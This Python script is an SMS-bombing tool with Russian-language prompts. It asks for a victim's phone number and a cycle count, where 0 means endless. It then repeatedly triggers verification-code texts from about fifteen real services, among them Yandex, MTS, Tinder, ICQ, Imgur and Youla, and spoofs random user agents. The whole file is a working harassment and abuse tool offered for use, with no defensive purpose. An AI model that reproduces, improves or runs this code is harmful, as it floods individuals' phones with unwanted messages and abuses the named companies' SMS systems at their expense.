import time
import fake_useragent
import requests
from termcolor import colored, cprint

user = fake_useragent.UserAgent().random
headers ={'user_agent' : user}
num = input("Введите номер теолефона: (Без +) ")
n = int(input("Введите кол-во циклов: (0 - бесконечно) "))
sleep = int(input("Введите задержку в секундах: "))

num_cash = num[0]+' ''('+num[1:4]+')'' '+num[4:7]+'-'+num[7:9]+'-'+num[9:11]
num_mts = num[1:4]+' '+num[4:7]+'-'+num[7:9]+'-'+num[9:11]
num_9 = num[1:]
num_kfc = '+'+num[0]+' '+num[1:]

i = 1
if n == 0:
    i = -1

while i <= n:
   
    response = requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={'phone' : num}, headers=headers)
    if response.status_code == 200:
        cprint("vsk sent", 'white', 'on_green')
    else:
        cprint("vsk not sent", 'white', 'on_red')
    
    
    response = requests.post('https://cash-u.com/main/rest/validate/phone', headers=headers, data={'' : num_cash})
    if response.status_code == 200:
        cprint("cash-u sent", 'white', 'on_green')
    else:
        cprint("cash-u not sent", 'white', 'on_red')
    
    response = requests.post('https://youla.ru/web-api/auth/request_code', headers=headers, data={'phone' : num})
    if response.status_code == 200:
        cprint("youla sent", 'white', 'on_green')
    else:
        cprint("youla not sent", 'white', 'on_red')
    
    response = requests.post('https://www.citilink.ru/registration/confirm/phone/+' + num + '/')
    if response.status_code == 200:
        cprint("citilink sent", 'white', 'on_green')
    else:
        cprint("citilink not sent", 'white', 'on_red')
    
    response = requests.post('https://login.mts.ru/amserver/UI/Login?service=login&srcsvc=sitemts&goto=https%3A%2F%2Fchel.mts.ru%2Fjson%2Fauth%2Fpublicuser%2Fafterlogin', headers=headers, data={'login' : num_mts})
    if response.status_code == 200:
        cprint("mts sent", 'white', 'on_green')
    else:
        cprint("mts not sent", 'white', 'on_red')
    
    response = requests.post('https://lenta.com/api/v1/registration/requestUserStatus', headers=headers, data={'phoneNumber' : num})
    if response.status_code == 200:
        cprint("lenta sent", 'white', 'on_green')
    else:
        cprint("lenta not sent", 'white', 'on_red')
    
    response = requests.post('https://my.modulbank.ru/api/v2/auth/phone', headers=headers, data={'CellPhone' : num_9})
    if response.status_code == 200:
        cprint("modulbank sent", 'white', 'on_green')
    else:
        cprint("modulbank not sent", 'white', 'on_red')
    
    response = requests.post('https://u.icq.net/api/v51/rapi/auth/sendCode', headers=headers, json={'phone': num, 'language': "ru-RU", 'route': "sms", 'devId': "ic1rtwz1s1Hj1O0r", 'application': "icq"})
    if response.status_code == 200:
        cprint("icq sent", 'white', 'on_green')
    else:
        cprint("icq not sent", 'white', 'on_red')
    
    response = requests.post('https://api.imgur.com/account/v1/phones/verify', headers=headers, json={'phone' : num})
    if response.status_code == 200:
        cprint("imgur sent", 'white', 'on_green')
    else:
        cprint("imgur not sent", 'white', 'on_red')
    
    response = requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/', headers=headers, data={'phone' : num})
    if response.status_code == 200:
        cprint("ivi sent", 'white', 'on_green')
    else:
        cprint("ivi not sent", 'white', 'on_red')
    
    response = requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={"phone_number" : num}, headers=headers)
    if response.status_code == 200:
        cprint("tinder sent", 'white', 'on_green')
    else:
        cprint("tinder not sent", 'white', 'on_red')
    
    response = requests.post('https://passport.yandex.ru/registration-validations/phone-confirm-code-submit', headers=headers, data={'number' : num})
    if response.status_code == 200:
        cprint("yandex sent", 'white', 'on_green')
    else:
        cprint("yandex not sent", 'white', 'on_red')
    
    response = requests.post("https://eda.yandex/api/v1/user/request_authentication_code", headers=headers, json={"phone_number" : "+" + num})
    if response.status_code == 200:
        cprint("eda.yandex sent", 'white', 'on_green')
    else:
        cprint("eda.yandex not sent", 'white', 'on_red')
    
    response = requests.post("https://api.sunlight.net/v3/customers/authorization/", data={"phone" : num}, headers=headers)
    if response.status_code == 200:
        cprint("sunlight sent", 'white', 'on_green')
    else:
        cprint("sunlight not sent", 'white', 'on_red')
    
    response = requests.post("https://account.my.games/signup_send_sms/", data={"phone" : num}, headers=headers)
    if response.status_code == 200:
        cprint("my.games sent", 'white', 'on_green')
    else:
        cprint("my.games not sent", 'white', 'on_red')
    
    i+=1


